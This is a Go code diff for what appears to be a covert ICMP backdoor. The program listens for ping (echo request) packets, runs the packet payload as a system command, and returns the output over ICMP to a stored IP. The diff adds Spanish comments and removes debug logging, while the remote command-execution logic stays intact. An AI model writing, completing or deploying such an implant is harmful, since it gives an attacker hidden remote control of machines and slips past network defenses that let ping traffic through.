@@ -7,7 +7,6 @@ import (
 	"log"
 	"os/exec"
 	"bytes"
-
 	"strings"
 	"os"
 )
@@ -17,18 +16,30 @@ var ip string
 func handlePacket(packet gopacket.Packet) {
 
 
+	/*
+	*	decodifica el payload
+	*/
 	command := string(packet.Layer(gopacket.LayerTypePayload).LayerContents())
+
 	args := strings.Split(command," ")
+
+	/*
+	* ejecuta el comando
+	*/
 	cmd := exec.Command(args[0],args[1:]...)
-		var out bytes.Buffer
+
+
+
+	var out bytes.Buffer
+
 	cmd.Stdout = &out
+
 	err := cmd.Run()
+
 	if err != nil {
 		log.Println(err)
 	}
 
-	log.Printf("in all caps: %q\n", out.String())
-	log.Println(ip)
 	icmp.Handler(out.String(),ip)
 
 
@@ -47,7 +58,6 @@ func main() {
 		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 		for packet := range packetSource.Packets() {
 			boolean := strings.Contains(packet.Dump(),"TypeCode=EchoRequest")
-			log.Println(boolean)
 			if boolean{
 				handlePacket(packet) // Do something with a packet here.
 			}
